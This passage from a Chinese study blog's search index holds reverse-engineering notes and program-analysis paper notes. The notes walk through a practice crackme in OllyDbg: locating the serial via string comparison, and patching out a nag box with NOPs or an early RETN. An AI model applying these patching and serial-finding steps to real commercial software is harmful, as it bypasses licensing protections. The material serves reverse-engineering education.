401232命令用于调用ThunRTMain()函数，这里使用了较为特别的法。\n不是直接转到MSVBVM60.dll里的ThunRTMain()函数，而是通过中间401232地址处的JMP命令跳转。\n\n\n\n\n\n\n\n提示\n4010A0地址是IAT(Import Address Table,导入地址表)区域,包含着MSVBVM60.ThunRTMain()函数的实际地址。第13章将详细讲解IAT。\n\n\n8.3.2 RT_MainStruct结构体RT_MainStruct结构体的成员是其他结构体的地址。也就是说，VB引擎通过参数传递过来的RT_MainStruct结构体获取程序运行需要的所有信息。\n8.3.3 ThunRTMain()函数它存在于MSVBVM69.dll模块中，这里是VB引擎的代码\n8.4 分析crackme\n根据显示的信息，用all reference string查找字符串。\n双击后，跳转到下面的地址。\n分析页面，应该是比较name和serial的值，如果相等就执行成功的代码，不相等，就输出serial wrong。\n因此，查看前后的代码，发现跳转指令。\n\nJE 跳转指令，ZF为1，跳转\n\nTest destination, source &#x2F;&#x2F;按位与，如果结果为零（所有位均为0），则将零标志位（ZF）设置为1；否则，将ZF设置为0\n\n8.4.2 查找字符串地址\ncall指令上面的两个Push，是调用该函数的参数。\n猜想40341B地址处的函数__vbaVarTstNe，应该是字符串比较函数。\n调试到该地址处。\nLEA EAX,DWORD PTR SS:[EBP-44] &#x2F;&#x2F; SS表示栈段，EBP-44是栈内的局部地址，LEA是load effective address，加载地址给EAX\n\n在此状态下查看栈\n\n使用follow in dump，查看在内存中的状态。\nVB中使用的是可变长度的字符串，直接显示的不是字符串，是16字节大小的数据。19F264-19F254刚好是16bytes\n\n在OllyDbg的Dump窗口中选择右键菜单Long-Address with ASCI Idump命令。该命令可以把Dump窗口的查看形式变得与栈窗口一样，特别是针对字符串地址时可以将相应字符串显示出来。\n此时可以猜测19F254处的UNICODE “B6C9DAC9”是实际的serial值。\n\n再次运行，输入得到正确的结果。\n\n8.4.3 生成Serial的算法显然当前是一个check的处理函数，那往前找，找到了这个，典型的栈帧代码。\n\n\n\n\n\n\n\n提示\n汇编指令NOP(No operation)：不执行任何的指令\n\n\n8.4.4 预测代码预测一下生成 serial的方式。\n对于win32 Api来说，\n\n使用VB引擎的API读取字符串\n启动循环，对字符串加密\n\n8.4.5 读取Name字符串的代码调试到这里\n\n这里定义了获取name的逻辑，EBP-88处存着name字符串。\n但是我并没有找到，不知道为什么\n8.4.6 加密循环\n简单讲解上述循环的动作原理，就像在链表中使用next指针引用下一个元素一样，vbaVarForInit0、vbaVarForNext0可以使逆向分析人员在字符串对象中逐个引用字符。并且设置loopcount(EBX)使其按指定次数运转循环。\n暂时先省略看汇编的部分，因为现在的主要工作也不是这个。\n8.5 小结Q1：TEST AX,AX指令的理解\n\n8.5 总结\n这一章的crackme的加密部分目前没有看，先整体的把这本书快速看完，总结基础的知识点，等开始刷题的时候再看\n\n0x09 Process Explorer 优秀的进程管理工具9.1 Process Explorerwindows操作系统一下一个优秀的进程管理工具\n0x10 函数调用约定10.1 函数调用约定栈是定义在进程中的一段内存空间，向下(低地址方向)扩展，且其大小被记录在PE头中。\nQ1：函数执行完成后，栈中的参数如何处理\n不用管。前面学的时候，在函数执行完毕，会把EBP的值给ESP，然后Pop ebp。所以其实并没有手动删除，只是在修改指针的位置。\n\n由于是临时使用的存储在栈中，即使不用了，把它清除掉也会浪费CPU资源\n在有新值时，原有值会被覆盖掉。且栈内存是固定的，不能释放。\n\nQ2：函数执行完毕后，ESP的值如何变化？\n\nESP恢复到函数调用前的状态。\n\n函数调用后，如何处理ESP是函数调用约定处理的问题。主要的约定是：\n\ncdecl: C declaration\nstdcall: standard call\nfastcall\n\n10.1.1 cdecl主要是在C语言中使用的方式，所以叫C declaration，调用者(Caller)负责处理栈。\nint add(int a, int b)&#123;\n    return (a+b);\n&#125;\nint main()&#123;\n    return add(1,2);\n&#125;\n\n对于这个代码，在函数执行完毕后，会执行让ADD ESP,8，相当于去掉了刚才压入的参数1 , 2，这是调用者直接清理的，所以是cdecl。\n\n\n10.1.2 stdcallstdcall常用于win32 ApI，该方式是被调用者(callee)清理栈。\nC语言默认是cdecl，使用_stdcall关键字，就可以用stdcall了。\nint _stdcall add(int a, int b)&#123;\n    return (a + b);\n&#125;\nint main()&#123;\n    return add(1,2);\n&#125;\n\n这里最后直接是RETN 8，也就是RETURN + POP 8，这个40101C本来就是要Pop掉的返回地址，再pop 8，所以此时esp指向了19ff2c\n\n\n\n这种方式的好处就是不用每次调这个函数都在主代码写一遍 ADD ESP 8。\n虽然Win32API是使用C语言编写的库，但它使用的是stdcall方式\n10.1.3 fastcallfastcall方式与stdcall方式基本类似，但该方通常会使用寄存器(而非栈内存)去传递那些需要传递给函数的部分参数(前2个)。\n若某函数有4个参数，则前2个参数分别使用ECX、EDX寄存器传递。fastcall方式的优势在于可以实现寸函数的快速调用(从CPU的立场看，访问寄存器的速度要远比内存快得多)。\n单从函数调用本来看，fastcall方式非常快，但是有时需要额外的系统开销来管理ECX、EDX寄存器。\n倘若调用数前ECX与EDX中存有重要数据，那么使用它们前必须先备份。\n此外，如果函数本身很复杂，导要把ECX、EDX寄存器用作其他用途时，也需要将它们中的参数值存储到另外某个地方\n0x11 视频讲座首先整个代码运行会显示这样两个东西，根据提示，那么第一步就是需要去除整个nags，也就是消息框。\n\n11.2 分析S1：预测代码\n\nVISUAL BASIC中调用消息框的函数是MSVBVM50.rtcMsgBox，也就是需要找到这个API\n在ollydbg中，打开all intermodular calls，找到rtcMsgBox，并给每一个都设置断点\n运行程序，程序运行到402cfe处，向上拖动滚动条找到了显示nag的代码\n\n这个E8 1DE4FFFF 一共10位，占5个字节，一个字节是8bits，每一个是4bits。\n\nCALL 00401120  &#x2F;&#x2F;32位操作数,在x86架构中，使用32位操作数的call指令占用5个字节\n\n\nS2：去除消息框\n尝试方法1：直接在402cfe调用函数处修改\n\n也就是不调用原来的函数了，但是需要对栈进行处理，所以用这个对栈进行处理。\n使用Nop填充2个Bytes，保证和call的长度一致。\n但是由于下面的命令中用了EAX寄存器的值，也就是用到了函数返回的值，所以这种方法就不行了。\n\n\n\n\n\n\n\n提示\nx86中使用EAX存储函数的返回值。\n\n\n尝试方法2：找到函数最开始调用的栈帧，让函数直接返回，不调用该函数\n该思想相当于在函数一开始就Return了，也就不会执行下面整个rtcMsgBox()函数了。\n一直想上找，找到函数最开始的栈帧，也就是push ebp mov ebp esp 的地方。\n直接修改为\n\nQ1：那这里的4是如何确定的呢？\n是根据栈确定的。\n\n首先让代码运行到push ebp处，此时栈中肯定已经压了函数的返回地址。\n找到函数的返回地址7401E5A9，那么7401E5A7是调用这个函数的地方\n在 执行完MOV EBP,ESP时，观察此时esp的值19fabc\n在执行到7401E5A9处时，观察esp的值此时是19fac0\n\n\n执行完之后\n（用结束的esp -  进去之后的esp）&#x2F;4 &#x3D;个数\n个数-2&#x3D; 实际的参数个数  2是ebp加上返回地址\n实际的参数个数*4是最终return的值。\n12&#x2F;4 &#x3D; 3 -2 &#x3D;1 个参数 就return 4。\n\n由于是stdcall(callee清理栈)，这里还可以一步一步调试程序，看是哪个程序跳转到了7401e5a9\n在402db2处发现了RETN 4这个清理参数的语句，也可以确定是RETN 4\n\nS3：查找注册码\n\n在取出了Nag之后，需要找到真正的注册码\n还是在all text string处，先根据提示的语句wrong serial找到具体的位置\n然后上下拖动滚动条，发现一个字符串比较函数__vbaStrCmp\n之后猜测上面这个应该就是真正的regiter code\n\n\n总结这一章通过一个例子来描述了整个过程，主要包括三步：\n\n预测代码，预测可能用到的函数，然后根据Intermodular calls找到代码位置\n修改目标函数，让它的功能不再起作用，有两种方法：\n直接在目标函数处修改，但要看是不是满足字节大小的匹配\n看目标函数的调用位置，向前寻找它的栈帧，让调用目标函数的函数提前返回，使目标函数不再起作用\n\n\n找到真正的注册码，根据错误提示信息，上下找，找敏感的函数，和关键的字符串\n\n","slug":"re-engineer-core-principle-01","date":"2023-10-22T08:36:19.000Z","categories_index":"","tags_index":"re","author_index":"XyM4ster"},{"id":"e225c813c8f4b0b48846cd97578ebb48","title":"Tai-e-Static-Analysis-Framework-OOPSLA'23","content":"引言\n这篇论文是我看谭老师课题组的第二篇文章，因为对于静态分析一直停留在理论，想着要看看代码，自己试试\n\nABSTRACT静态分析在Bug detection、安全分析、程序解释、优化等方面已经非常成熟。\n静态分析在IR生成、confrol flow graph、control flow graph构建、指针和别名分析的计算等方面都有应用。\n作者设计这个静态分析框架遵循HGDC的原则(Harnessing the Good Designs of Classics)：\n\nfor each crucial component of a static analysis framework, we compare the design choices made for it (possibly) by different classic frameworks such as Soot, Wala, Doop, SpotBugs and Checker\nchoose arguably a more appropriate one; but if none is good enough, we then propose a better design\n\n1 Introduction对于设计一个静态分析的框架来说，重要的是平衡simplicity、usability、effciency。\n我们缺乏一个systematic view去检查静态分析框架的质量，从依赖这些框架去创建新的分析的开发人员来说。\n作者讨论了对于Java静态分析框架一些关键组件的trade-off：\n\nProgram Abstraction：需要一个抽象的模型，去取代所有各种静态分析中的元素\nFundamental Analysis：它应该支持基本的facilities，允许分析开发人员使用分析友好的结构，使用control flow 和 call graph去实现经典的graph-based algorithms\nNew Analysis Development：应该提供一种机制，开发和分析 new analysis，包括bug detectors security analyzers客户端，以及像异常和反射分析等。(最后一节课里的内容)\nMultiple Analysis：它应该提供一个标准化的方法来管理多个分析\n\ndoop、SpootBugs、FindBugs、Checker\n本文的贡献：\n\nTai-e是一个 usage-friendly IR对于开发指针分析来说\nTai-e是一个高效的指针分析系统，很容易用它创建新的指针分析算法\nTai-e也提供了一个插件，用于&#x3D;&#x3D;taint analysis和exception analysis&#x3D;&#x3D;\n\n作者列举了一些人对Tai-e框架的使用反馈。\n2 Program Abstraction静态分析框架需要提供程序的abstraction model,包括IR，type system， class  hierachy等。\nSoot和Wala都有特殊的IR，Tai-e的IR受到了这两个框架的启发而来的。\n\n它可以implement more concise analysis\nbetter understand  intents of IR\n\ntai-e是developer-friendliness，从以下几个方面：\n\n和soot相比，Tai-e区分了不同类型的assign statement\n对于Api的设计，使用了具体的return type对于expression retrival,避免使用integer进行索引去represent variables，这和Soot Wala不一样\n程序元素的组织和可访问性例如values tyoes namse，不像wala，Tai-e集中所有变量相关的信息到一个single interface，没有把他们分到不同的interface。\n\n由于(1)和（2）,Tai-e能让Developers写更简洁的代码。避免不必要的条件检查，在写各种变量和表达式时，进行向下转换。\n(3)可以让开发者更容易了解Tai-e的功能，\n用下面的例子来说迷宫上述的设计。\n1. 对于Soot\nSoot把内部所有带有 &#x3D; 操作符的语句表示为AssignStmt，不区分具体的类型，到底是load store new unary binary statement。但是wala和Tai-e区分。这就可能引起类型检查。\n\n\n这里line 2的Declared type 是AssignStmt，AssignStmt是Soot的类结构中代表binary statement 的 lowest-level interface\n我理解这里的Low就是最底层的接口，也就是它是一个很大的范围，像object一样，所以就需要类型检查，因为它太大了\n\n\n\nSoot总是返回Value(the highest-level interface in the class hierarchy)去代表数据，因此需要类型转换去决定数据的具体类型。\n\n\n已知一个binary statement的左操作数是local variable\n但是soot返回的是Value，这就需要再转成Local\n\n2. Wala\nWala没有上面的问题，它采用不同的策略去代表local variables。\n使用int-index的方式。\n\ngetUse会返回一个int值，它作为一个索引去访问操作数的信息。\n之后在这个Symbol表中，用这个索引去获取值\n\n\n\n这种的缺点就是不直接，当变量的信息多的时候，就很困难。\n3. Tai-e\n避免了上述提到的所有问题，因为程序经常会有很多不同的statement和expressions，用Tai-e更方便。\n此外，对于指针分析，Tai-e把每个变量v和它相关的statement关联起来，一旦v的值改变了，开发者可以直接通过IR获得所有的相关的 statement。\n3 Fundamental Analysis静态分析是对于抽象的数据是如何沿着程序的控制结构流动的，根据程序的语义和运行时环境。\n一个静态分析的框架应该提供基本的产生控制结构的能力，像control flow and call graph\n此外，需要一个指针分析去计算程序中指针相关的变量的可能的值\n3.1 Pointer AnalysisSoot提供了一个context-insensitivity的指针分析系统，Spark，这个运行非常快。\nWala实现了一个context-sensitivity的指针分析系统。\nDoop是另一个指针分析框架，is full of clever and useful design\n不像Soot，wala和Tai-e是imperative，因为是用Java实现的\nDoop是Declative，是用Datalog实现的，他被认为是一个主流的平台去实现和比较指针分析算法。\n对于Java来说，设计一个指针分析系统，需要考虑下面这些key points：\n\n\n指针相关的信息如何表示，这也是指针分析算法的核心\n一个context manager，处理上下文敏感问题\nHeap manager，处理heap object\n解决指针相关信息的传播问题\n\nRepresentation of Points-to Information\n指针分析需要一个统一的结构去代表和每个变量相关的指针集\nSpark和Wala都采用一种混合的方式\n当set的尺寸小于某些值时，使用array去存储指向的对象\n否则，当set的尺寸大于某些值时，用一个bit  set去代表指针集\n\n\nTai-e也用这种方式\n\n\n&#x3D;&#x3D;这里dragon之前给我讲的那个zpoline是啥来着？？&#x3D;&#x3D;\n但是他改进了，上图左边的是spark wala采用的方式，就用0-4096来设置，但是有很多空间浪费了。\n作者的方式是右图，采取了类似于 virtual memory的方式，用sparse bit set(稀疏点集)去代表指针集。\n16个Integer，每个是32bits，指向16个256的set，总共是4096。\n但是因为这里就用了4个object，所以总共就是256x2 + 16 x 32，\n&#x3D;&#x3D;但是这里为什么是32bits呢？&#x3D;&#x3D;\n实际上，作者用two-level的page table去节约更多的空间\n\ntable的size根据对象的指针集动态决定\n与常规的bit set比，对于context-sensitivity的指针分析，节省了很多内存。\n许多对于C language的work，设计了 new bit sets，这也可以同样应用于java\nDoop 是Declartive，它的指向集合是开发人员无法访问的.\n&#x3D;&#x3D;(就像数据库一样,是受保护的??)&#x3D;&#x3D;\n\nContext Manager对于各种上下文敏感 variants 有不同的context length method call heap object,因此需要一种方法来管理.\nQ1:现有的指针分析框架对于上下文敏感的问题\n\nSoot没有上下文敏感,\nSprak是C.I.\nPaddle是一个基于BDD的C.S.指针分析,它的效率不如Doop\nDoop是有许多rules来实现C.S.,但是对于不同的C.S.分析,需要写不同的实现,让代码很冗余\n\nQ2:Tai-e的C.S.\n\nTai-e是imperative,对于同样的C.S.分析,它把context length作为输入的参数\nWala只提供了context management对于方法调用,它的heap context直接继承于方法的上下文\n和Wala相比,Tai-e提供了更灵活的context management,可以具体的定义上下文,是 method call还是 heap object,比如可以给method call 用3-call-site,给heap object 用1-call-site\n\nQ3:selective context sensitivity\n\n之前的论文也提到,他是一个很state-of-the-art的技术\n目前现有的selective C.S.都已经被Tai-e实现了\n\n3.2 Control&#x2F;Data Flow Analysis对于data flow analysis,作者列举了不同的框架,可以简化control&#x2F;flow analysis分析的实现\nControl Flow Analysis\n它的主要任务是构建CFG,但是用不同的框架,效率不一样\nEdge categories\n\nSoot Wala  Checker不对边进行分类,例如 IF_true IF_false caugt_exception\n如果分类了,会对 path  sensitive and branch-correlated analysis  exceptionspecic handling 有很好的处理\n\n\nTai-e和SpotBugs对边进行分类,但是Tai-e提供了额外的有用的边信息.\nlabel  switch edge用case value\n给exception edge加上具体的异常类型\n\n\n开发者也能在Soot Wala中获得边的信息,通过解析相关的node,但是这不方便\nCheck不对边进行分类,但是对CFG node进行分类,例如 ConditionalBlock ExceptionBlock,可以通过API从block中获得edge 的信息\n\nException handling\n对于Java来说,一个关键的影响构建CFG的有效性的因素是如何解决Java的一场,被认为是control flow analysis中不完整的一个关键因素\n有显式和隐式异常, 如果catch 到的异常类型匹配,就通过throw statement抛出相应的异常,之后由JVM隐式执行.\n一个完整的CFG应该考虑异常,但是很多隐式的异常和正常的flow是没有交互的,因此考虑他们可能会降低分析的精度.\n和Wala SpotBugs Check不同,Tai-e Soot区分控制流的显式和隐式异常,允许用户决定在CFG上添加哪个.\nTai-e也实现了最先进的异常分析,比其他的解决异常的精度更高,提供一个选项在构建CFG的时候.\ndata flow analysis\n为了实现数据流分析,开发者可以使用数据流分析系统提供的接口,去做一些具体的操作,让这个分析满足monotonic 和safe0approximated\n\ndata facts抽象和初始化\n\n对于不同的statement的transfer function \n\n对于Merge的数据,是join 或者meet的操作\n\n\ndata facts initialization\n\nSoot Wala不允许initialize data facts,他们在solver中实现了相关的API,因此每次对于一个new analysis需要不同的initialization,都必须实现一个new solver去实现API\n一个优秀的设计应该只有一个solver去驱动多个数据流分析,以便开发者只需要集中于analysis的实现,而不需要集中于solver的实现\n\nEdge transfer functions\nSpotBugs Wala. Soot Check 都不显示的支持edge transfer function\nEdge Transfer function 和 node transfer function不同,对于一个node的后继节点,他们沿着边把data facts发送给各种后继节点,这些node使用分支信息(当expressions E是有效的,fact D就被传播);来做更有效的analysis.\n当edge的transfer function里面没有内容的时候,就把source node 的Out fact当成target node 的In fact,这也就是常的Node transfer function的分析.\n但是在Soot中,为了利用branch information,开发者需要extend一个特殊的分析 BranchedFlowAnalysis并且实现edges 和nodes的相关逻辑在node的transfer function中,这很不方便且冗余.\nChecker不直接支持edge transfer function,它把node transfer的结果分成不同的类,例如then或者else分支.Solve可以传播then的结果给相应的successor沿着then branch,让开发者可以有相同的功能像edge transfer function一样.\n这可能需要处理edge相关的facts在node transfer function中,耦合了node 和 edge transfer function的逻辑\nChecker的标准和其他的框架各不一样,它加强了Java的 type system,通过让开发者给types写qualifiers(本质上是Java的注解,就是@Autofired的这种),通过type qualifier inference来进行分析.这种机制事实上是很有效的,未来在Tai-e中可能用annotations去辅助静态分析&#x2F;\n&#x3D;&#x3D;来自gpt:&#x3D;&#x3D;\n类型修饰符\n在某些编程语言中，类型修饰符可能需要显式地指定，以明确表达变量或参数的特性。然而，对于某些情况，编译器可以根据上下文自动推断出适当的类型修饰符，而无需显式指定.\n具体来说，类型修饰符推断可以根据以下情况进行推断：\n\n变量初始化：当变量被初始化时，编译器可以根据右侧表达式的类型推断出变量的类型修饰符。\n方法调用：当调用带有类型修饰符参数的方法时，编译器可以推断出传递给方法的参数的类型修饰符。\n返回值推断：当方法具有明确的返回表达式时，编译器可以根据返回表达式的类型推断出方法的返回值的类型修饰符。\n\n（type qualifier inference）可以优化程序的主要原因是它可以减少代码中显式类型修饰符的冗余，从而简化代码并提高可读性。\n类型修饰符推断如何优化程序的一些方面：\n\n减少冗余的代码：通过自动推断类型修饰符，开发人员不需要显式地为每个变量、参数或返回值指定类型修饰符。这减少了冗余的类型修饰符声明，使代码更加简洁和清晰。\n提高可读性：通过省略显式的类型修饰符，代码变得更加简洁和易读。开发人员可以专注于核心逻辑而不是类型修饰符的繁杂声明，使代码更易于理解和维护。\n提升开发效率：类型修饰符推断减少了开发人员编写和维护代码中的冗余类型修饰符的工作量。这样，开发人员可以更快速地编写代码，减少了错误的可能性，并提高了开发效率。\n更好的可扩展性：类型修饰符推断使代码更具灵活性和可扩展性。当引入新的类型修饰符或修改现有的类型修饰符时，开发人员不需要手动更改整个代码库中的每个类型修饰符声明。编译器可以根据上下文自动推断类型修饰符，从而使代码库的维护更加容易。\n\n4 New Analysis Development一个静态分析框架应该提供整合new analysis的能力，从intraprocedural 到interprocedural\n这里介绍了指针分析过程中可能用到的类，像reflection analysis和exception analysis的基本原理，Bug finders和security analyzers client\n对于Doop\n这里省略\n对于Wala\nwala提供一种机制在添加new analysis时，和pointer analysis进行交互\n\n首先，devlopers需要实现一个ContextSelector 的接口，来指定相关的call site，\n在call site处，new analysis 基于pointed-to results 进行model\n\n例如：分析reflective call v = c newInstance()\n\ndevelopers encode ContextSelector to identify this call site and retrieve the Class objects,CO，\n\n就是找到对应的类，和call site\n\n\n根据pointed-to results，c指向co \n\ndevelopers 需要实现 ContextInterpreter，生成fictitious but effect-equivalent IRS(e.g., v &#x3D; new T(); v.&lt; init &gt;()) according to the resolved types of CO (say T)\n\n因为newInstance本身也是在new一个对象，分析的时候要把它当成new一个对象\n根据之前CO所属的类，去分配一个对象\n\n\nThen these generated IRs are fed back to pointer analysis to continue the resolution for this reective call.\n\n\n上述就是一个Java反射创建对象的过程，正常我们也是这样理解的，把我们理解的转换成IR，并反馈给pointer analysis.\n上面的scheme很容易理解，但是对于Pointer analysis来说，有一些限制\n(这部分先不看了，我觉得主要还是理解代码)\ntai-e引进了一个analysis plugin system\n\n\n\n对于call site 1来说，\n\nedge的source就是call site1，target是目标方法source。\n进入if，如果目标放是source，创建一个污点对象o，\n然后更新这个solver，call site的 left-hand side variable，也就是s1，指向一个五点对象o\n\n对于call site2来说，\n\nedge的source是call site2，target是目标方法concat。\n\n此时的concat是一个transfer，在这行Transfer中，污点对象从参数s1，流到了s3中\n\n对于tansfer，应该把from指向的污点对象，也加到to的指针集中。也就是把o也加到s2的指针集中\n\n现在s3也指向了污点对象，transfer from s1\n\n这个transfer relatin也被添加到  transferVars中，用于记录来自transfer metho的污点相关的数据流edge\n\n\nOnNewPointesToSet\n\n这个就很好理解了，相当于污点数据的传播，把污点数据传给其他边。\n\nOnFinish\n\n当达到fixed point时，solver就会调用Onfinish\n对于每个sink method和他的敏感参数param_i,onFinish识别他的call site cs，并且检查是否有污点数据流到param_i，如果有，就报告污点信息。\n\n5 Multiple Analysis management在很多情况下，一个分析依赖于其他分析的结果。\n因此：\n\n如何配置一个analysis 和它的dependencies？\n如何保存一个分析的结果并在其他分析中访问？\n\nConfigure Analysis and its Dependencies\n可以通过配置文件来记录所有新的分析。\nStore&#x2F;Access Analysis Results\n6 Evaluation\n总结\n这篇文章看下来，目前还有很多不懂的地方，因为我没有真的用过Soot、Wala\n下来要自己尝试一下实现的代码，同时跑一下上一篇论文的实验\n感觉静态分析很难，自己只是刚刚入门。\n\n","slug":"Tai-e-Static-Analysis-Framework-OOPSLA-23","date":"2023-10-17T01:44:12.000Z","categories_index":"","tags_index":"Program Analysis,论文","author_index":"XyM4ster"},{"id":"39f6a6f9864fa629c2ab8230b6f47fbc","title":"Context-Sensitivity-without-Contexts-PLDI23","content":"引言\n学完了南大软件分析的课程，关注了谭老师的个人主页。\n想着看一篇论文，能对学的内容有更好的理解。\n\nAbstractQ1：首先说上下文敏感的做法\n\n在不同上下文中分析，分离方法变量，和堆对象，也就是同时应用上下文敏感和堆上下文敏感\n\nQ2：但是这种方法带来了问题：\n\n因为需要clone不同的上下文，每个都要单独分析\n\nQ3：现在有了selective context-sensitivity\n\n只对选定的方法应用上下文敏感\n其余方法应用C.I.\n\n问题：啥是选定的方法呢？\nQ4：但是这种方法效率有限\n\n并没有从根本上改变上下文敏感性的主要方法\n\nbecause the selective approaches do notfundamentally alter the primary methodology of context sensitivity\nQ5：提出clone的本质\n\n不同上下文下，clone的主要目的是把merge到一个callee method的flow 过滤掉\n我的理解也就是不让他merge\n\nQ6：提出本文的方法\n从PFG的视角\n\nsuch effect can be simulated by cutting off (Cut) the edges that introduce precision loss to certain pointers \nadding Shortcut edges directly from source pointers to the target ones circumventing the method on PFG\n\nIntroduction\n指针分析是一组静态分析技术，旨在计算程序指针在程序执行期间可能指向的一组抽象值\n\nQ1：参考文献分别指出了\n\n传统的C.I.指针分析，和PFG的一些基本概念，指针集沿着PFG的边传播\n\nC.I.的低精度问题\n\n\nQ2：接着为了改善精度，就有了C.S.\n\n包括call site sensitivity\nobject sensitivity\ntype sensitivity\n\n但是即使应用最广泛的2obj sensitivity，在复杂的程序面前，也没法在短时间内分析完\nQ3：为了分析更复杂的程序，有了selective context-sensitivity\n就是关于如何选择上下文的，能让指针分析更快的，这里面还有他们自己之前提出的方法。\n\n这些方法需要预先分析选定一组方法\n接着只对选定的方法进行上下文敏感的分析。其余应用C.I.\n\n但是还是在纠结于怎么选，C.S.的核心方法没有改变\n\n仍然需要复制方法\n\n仍然需要在不同的上下文中分别分析每个方法的元素\n\n一旦其中几个威胁到可伸缩性，分析就会面临非常缓慢甚至不可扩展的风险\n\n\n这里的扩展性指的是特殊的方法么，就是不适用的？\nGPT\n\n可扩展性是指指针分析算法或技术能够有效地处理大型代码库和复杂程序的能力\n也就是随着代码量的增加，可以很好的应对，不是时间复杂度指数级的增长\n\nQ4：C.I.的原因是\n\n方法 m的数据流会merge，然后再流出去\n\nQ5：本文方法的核心\n\n不需预先分析\n只是在on-the-fly(动态执行)上下文不敏感的指针分析算法在PFG中\n\n它的核心是PFG(N,E)：\n\nN是PFG，node的集合和edges的集合\nE是边，包括\nedges to cut off\nshortcut edges to add\n\n\n\nwhich edges to cut off?\n\n切断这样的边：可能把方法内部merge的object flow，带到方法外部某处的边\n换句话说：精度损失的主要原因是流出去了，那我现在不让他流出去，在内部瞎转悠，又不会影响其他的方法\n\nwhere to add shortcuts？\n\n在object flow merge之前 locate 一下，作为source。上一步不是有cut edge么，cut edge的目标作为target，\n\nQ4：但是具体该怎么做呢？\nMotivating Example \nFigure1（a）\n\n对于这个程序，a就是应用上下文不敏感进行分析，和学的一样，会Merge\n\n如果用上下文敏感来进行分析的话，那就会把上下文clone两次，这样也会消耗很多资源\n\n\nFigure1（b）\n\n带x的箭头就是，cut off，blue的箭头代表添加的shortcut\n因为不准的原因是，第4行代码的store语句，会让数据流从item流到o15.item 和o20.item，因此把他cut\n让item1直接指向o15.item\n\n因此就是用C.I.的指针分析算法加上cut off和shortcut，就能得到和上下文敏感同样的精度\nThe cur-short approach ,Informally这一部分定义了对于不同代码的不同principle\nfile access pattern、container access pattern、local flow pattern\noverview通俗的解释本文的过程是，对于merge的数据流，cut掉出口，在PFG上添加shortcut\nLocal Pointers：指针p是方法m的局部变量，称为local pointers，否则p就是non local，当p在m的外部定义，或者p是一个instance field\nNebulous path, Entrance and Exit：\n\n\n这个紫色的框从item–&gt;o15.item–&gt;r，就是一个Nebulous path。serItem方法是Entrance，getItem方法是exit\n\n有两个setItem方法的non-local 指针，他们merge到了该方法的指针item(文中用s表示start开始)，最后会有一个分支，getItem方法的local 指针r，r 导出去了两个getItem方法的non-local指针。\n\nTarget and Source pointers:\nTarget：指的是所有p（Nebulous path)的end node的所有后继节点，他们接收merge的结果，也就是上图中的item1，item2\nSource：指的是所有P（Nebulous path)的start node的所有前驱节点，他们是merge贡献的来源，也就是上图中的result1，result2\n\n这个就很好理解了，然后作者说：\n\n他不会把已经添加到PFG中的边真正的cut掉，因为程序是动态的，你添加上了，就会有指针集的流到\n而是不添加应该cut的边\n\n为了有更好的精度，需要找到尽可能多的target,cut off这些会引起 指针分析精度丢失的边，并且对于每个Target，找到他对应的source，然后添加shortcut。\n但是对于真正的程序，很难找到一种通用的方法来处理所有的精度丢失问题。\n在分析时，必须确保分析的soundness。\n问题：是不是需要学一下指针分析课程的最后一节？\n对于一般的程序来说，主要的代码是file access pattern、container access pattern、local flow pattern，这三个会引起指针分析精度的丢失，因此重点讨论一下，在这三种情况下，entrance、exit、source、target分别对应的是啥。\n问题：一直在说没有上下文，不需要clone，不需要选择上下文，这个还没理解好。\nField Access PatternJava中有两种field，分别是load 和store\nhandling of Store\n对于x.f&#x3D;y，这种情况。\n\n方法m包含了start node，并且x和y来自于方法m的parameters(也就是Item item，因为这会在传参时候污染)或者variable\n\n这里的parameter，我理解就包括this，形参定义的参数\n\n\n不同的call的参数会在方法m内部merge\n\n\n这是导致指针集不准的原因\n\n这里看Figure1，不准的原因是会merge，而且这个item(3)还会传给this.item。\n\n所以，作者对于cut-shortcut的idea是\n对于cut\n\n首先找到 x.f &#x3D; y，这样的表达式，并且满足\n\nx和y都是方法m的参数(this或者形参)\nx和y没有重写，保证它确实是从call site处传过来的，也就是确实merge了\n\n\n如果发现了这样的statement，这就形成了nebulous path（参照前面nebulous path的定义，确实一个node就能形成，因为它进来是汇聚，出去是分支），此时方法m，就是entrance 和exit。\n\n此时的target就是x.f所访问的，也就是figule 1 (a)中的o15.item和o20.itemm\n\n把这个store的边 cut掉\n\n\n对于shortcut\n\nitem1就是source，o15.item是它对应的target，加上一条shortcut，item2是source,o20.item是target\n\nhandling of load\n对于load语句\nx &#x3D; y.f\n\ny来自于方法m的parameter\nx是方法m的返回值，并且x的值由y,f获得，对象在方法m内部merge了\n\n\n根据上面的规则\n\n方法getItem包括r\nthis是方法getItem的参数\nr是返回值\n\n作者的idea是cut off 方法m的return edges\n\n首先找到一个statement：x&#x3D;y.f\ny的值是方法m的参数，并且没有重定义\nx是m方法的返回值\n\n\ncut off return edges，从方法m到接收变量的这个边被cut掉\n\n对于上图的结果就是，cut掉r到result1，和r到result2，加一个o15.item到result1，和o20.item到result2 \nhandling of Nested Call for Field Access（处理字段访问的嵌套调用）如果对于嵌套的方法调用，按照上面的分析，就可能会有问题。\n比如这个\n\n这里显然是不能直接加t–&gt;o8.f和t–&gt;o10.f，这里我理解nebulous path的start node是t，所以source 就是t1 t2，target就是o8.f和o10.f，只是要一直向前找，找method的caller，caller的caller，直到找到真正的target\n详细的会在Section 4.2中说明\nContainer Access Pattern关于容器的处理，之前学的指针分析算法，并没有这部分的内容。\nHanding of Containers这里其实和上面是类似的，对于ArrayList来说，add方法，也是一个方法，那就也会merge。\n\n\n这里认为add方法是entrance，get方法是exit。\n\n那这里a b就是一个source，理解成 $Entrance_{cs}^{arg}$，当前调用点的参数\n\nx和y就是target，理解成$Exit_{cs}^{lhs}$，当前调用点exit方法的接收变量(lhs)\n\n所以就在对应的$Entrance_{cs}^{arg}$和$Exit_{cs}^{lhs}$上添加shortcut edges\n\n\nQ1：那如何判断entrance 和 exit是不是对应的呢？\n如果是同一个container，比如 line3的add（）和line4的get()，那entrance 和 exit肯定是Match的\n\n\n也就是看$Entrance_{cs}^{rv}$和$Exit_{cs}^{rv}$的指针集是否有重叠，指向同一个地方，是不是同一个调用点\n例如line 3的entrance rv是l1，line4 get方法是exit，它的rv是l1，他俩的指针集 overlap\n\n\n\n但是这种方法不能处理其他的容器，例如iterators和Map的keySet()，这是为啥呢？？1\nQ2：为了解决上面的，引入了Pointer-host map(ptH)\n现在我还不知道对应的rules是啥样的，只能按照当前的理解\n\n$pt_H(l1)&#x3D;{o_1}$表示arrlist o1 被assign 给了 l1\n\n\n因此如果$pt_H(Entrance_{cs}^{rv})$和$pt_H(Exit_{cs}^{rv})$ 